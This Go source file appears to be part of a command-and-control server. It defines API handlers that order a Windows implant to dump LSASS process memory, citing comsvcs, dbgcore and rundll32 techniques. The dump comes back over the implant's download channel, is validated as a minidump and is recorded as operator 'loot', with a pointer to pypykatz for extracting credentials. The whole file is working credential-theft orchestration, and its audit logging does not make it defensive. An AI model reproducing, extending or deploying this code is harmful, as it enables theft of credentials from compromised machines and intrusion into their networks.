package api

import (
	"BackendTemplate/pkg/command"
	"BackendTemplate/pkg/cred"
	"BackendTemplate/pkg/database"
	"BackendTemplate/pkg/metrics"
	"BackendTemplate/pkg/sendcommand"
	"BackendTemplate/pkg/utils"
	"BackendTemplate/pkg/utils/logx"
	"encoding/binary"
	"fmt"
	"net/http"
	"path/filepath"
	"strings"
	"time"

	"github.com/gin-gonic/gin"
)

// ===== 凭据获取（阶段三）=====
//
// 链路：operatorOnly 接口 → 建任务(kind=cred) → 登记"等待回传的制品"
//      → 下发 CRED_DUMP → 客户端获取内存转储 → 经**下载通道**回传
//      → 下载完成回调按文件名匹配 → 校验 minidump → 登记制品 + 收敛任务 + 审计。
//
// 刻意不做的事：服务端不解析转储内容（那是 mimikatz/pypykatz 的活），
// 只保证"制品是真的、归属是对的、谁在什么时候取过有记录"。
// 凭据获取是最敏感的运维动作，审计与归属比解析功能重要。

// credArtifactTTL 制品回传等待上限：超时后不再把回传的文件认作该请求的产物
const credArtifactTTL = 30 * time.Minute

// DumpCredential POST /api/cred/dump  {uid, kind, tech}
func DumpCredential(c *gin.Context) {
	var req struct {
		UID  string `json:"uid"`
		Kind string `json:"kind"`
		Tech string `json:"tech"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	req.UID = strings.TrimSpace(req.UID)
	req.Kind = strings.TrimSpace(strings.ToLower(req.Kind))
	req.Tech = strings.TrimSpace(strings.ToLower(req.Tech))
	if req.UID == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "缺少 uid"})
		return
	}
	if req.Kind == "" {
		req.Kind = cred.KindLsass
	}
	if !cred.IsKindSupported(req.Kind) {
		c.JSON(http.StatusBadRequest, gin.H{"error": "不支持的凭据类型: " + req.Kind})
		return
	}
	if req.Tech == "" {
		req.Tech = "auto"
	}
	if !cred.IsTechSupported(req.Tech) {
		c.JSON(http.StatusBadRequest, gin.H{"error": "不支持的获取技术: " + req.Tech})
		return
	}

	// 协作：会话被其他操作员占用时拒绝（凭据获取是最不该撞车的操作）
	if !checkSessionLock(c, req.UID) {
		return
	}

	client, err := database.GetClientByUid(req.UID)
	if err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "客户端不存在: " + req.UID})
		return
	}
	// 技术选型都是 Windows 专有路径（comsvcs/dbgcore/rundll32），非 Windows 会话直接拒绝，
	// 不让操作员对着 Linux 会话点下去等一个必然失败的任务
	if !strings.EqualFold(client.Os, "windows") {
		c.JSON(http.StatusBadRequest, gin.H{"error": "凭据获取当前仅支持 Windows 会话（该会话系统: " + client.Os + "）"})
		return
	}

	operator := operatorFromContext(c)
	fileName := cred.NewFileName(req.Kind, client.Computer, time.Now())
	if err := cred.Global.Issue(cred.ArtifactRequest{
		UID: req.UID, Kind: req.Kind, FileName: fileName, Tech: req.Tech, Operator: operator,
	}, credArtifactTTL); err != nil {
		c.JSON(http.StatusConflict, gin.H{"error": "已有相同的获取请求在进行中: " + err.Error()})
		return
	}

	cmdText := fmt.Sprintf("%s %s", req.Kind, req.Tech)
	_, rows := createTaskRows([]string{req.UID}, operator, "cred", cmdText)
	var taskID int64
	if len(rows) > 0 {
		taskID = rows[0].Id
	}

	// 帧格式与服务端/客户端常量一致：cmdBuf = "kind|tech|fileName"
	cmdTypeBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(cmdTypeBytes, command.CRED_DUMP)
	frame := utils.BytesCombine(cmdTypeBytes, []byte(req.Kind+"|"+req.Tech+"|"+fileName))
	if err := sendcommand.SendFileUploadCommandChecked(req.UID, frame); err != nil {
		cred.Global.Cancel(req.UID, fileName)
		finishTask(taskID, taskStatusFailed, "", err.Error())
		auditLogEvent("CRED_ACCESS", "FAILURE",
			fmt.Sprintf("凭据获取下发失败 %s/%s: %v", req.Kind, req.UID, err), nil)
		c.JSON(http.StatusServiceUnavailable, gin.H{"error": "下发失败: " + err.Error()})
		return
	}

	auditLogEvent("CRED_ACCESS", "START",
		fmt.Sprintf("%s 对会话 %s 发起 %s 获取（技术: %s，制品: %s）", operator, req.UID, req.Kind, req.Tech, fileName),
		map[string]interface{}{"uid": req.UID, "kind": req.Kind, "tech": req.Tech, "artifact": fileName})
	publishOperatorAction(req.UID, operator, "cred", req.Kind+" "+req.Tech)

	c.JSON(http.StatusOK, gin.H{
		"status":  http.StatusOK,
		"task_id": taskID,
		"data": gin.H{
			"file_name":  fileName,
			"kind":       req.Kind,
			"tech":       req.Tech,
			"expires_in": int(credArtifactTTL.Seconds()),
		},
	})
}

// ListCredArtifacts GET /api/cred/artifacts?uid=
// 返回"等待回传的请求"与"已登记的制品"两部分：前者让操作员知道还差什么，
// 后者是已落地的成果（制品本体在 Downloads 目录，用文件下载接口取回）。
func ListCredArtifacts(c *gin.Context) {
	uid := strings.TrimSpace(c.Query("uid"))

	pending := cred.Global.Pending(uid)
	artifacts := make([]database.Loot, 0)
	if database.Engine != nil {
		session := database.Engine.Where("source = ?", cred.KindLsass)
		if uid != "" {
			session = session.And("uid = ?", uid)
		}
		_ = session.Desc("id").Limit(200).Find(&artifacts)
	}

	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK, "data": gin.H{
		"pending":   pending,
		"artifacts": artifacts,
	}})
}

// matchCredArtifact 下载完成回调的凭据分支：
// 命中未完成请求时按凭据链路收敛（校验制品 → 登记 → 任务终态 → 审计），
// 返回 true 表示这个文件是凭据请求的产物，调用方不必再按普通下载处理。
func matchCredArtifact(uid, filePath, status string) bool {
	fileName := filepath.Base(filePath)
	req, ok := cred.Global.Match(uid, fileName)
	if !ok {
		return false
	}

	if status != command.DownloadStatusCompleted {
		finishTask(req.TaskID, taskStatusFailed, "", "制品回传未完成（客户端断开或长时间无数据）")
		auditLogEvent("CRED_ACCESS", "FAILURE",
			fmt.Sprintf("%s 制品回传未完成: %s", req.Kind, fileName),
			map[string]interface{}{"uid": uid, "artifact": fileName})
		return true
	}

	info, err := cred.ValidateMinidump(filePath)
	if err != nil {
		// 半截文件/权限不足导致的空转储必须显式失败，不能登记成"制品"
		logx.Warnf("❌ [CRED] 制品校验失败 uid=%s file=%s: %v\n", uid, fileName, err)
		finishTask(req.TaskID, taskStatusFailed, "", "制品校验失败: "+err.Error())
		auditLogEvent("CRED_ACCESS", "FAILURE",
			fmt.Sprintf("制品校验失败 %s: %v", fileName, err), map[string]interface{}{"uid": uid})
		return true
	}

	metrics.CredArtifact(req.Kind)
	finishTask(req.TaskID, taskStatusCompleted, fmt.Sprintf("制品已回传: %s（%s）", filePath, info.Describe()), "")
	auditLogEvent("CRED_ACCESS", "SUCCESS",
		fmt.Sprintf("%s 制品已回传: %s（%s）", req.Kind, fileName, info.Describe()),
		map[string]interface{}{"uid": uid, "artifact": fileName, "size": info.Size})
	AddLootIfNotEmpty(uid, "dump", "", "", "", filePath,
		fmt.Sprintf("%s 内存转储，%s；本地解析: pypykatz lsa minidump <文件>", strings.ToUpper(req.Kind), info.Describe()),
		req.Kind)
	command.PublishEvent(command.EventLootNew, uid, map[string]interface{}{
		"type": "dump", "source": req.Kind, "file": fileName, "operator": req.Operator,
	})
	return true
}
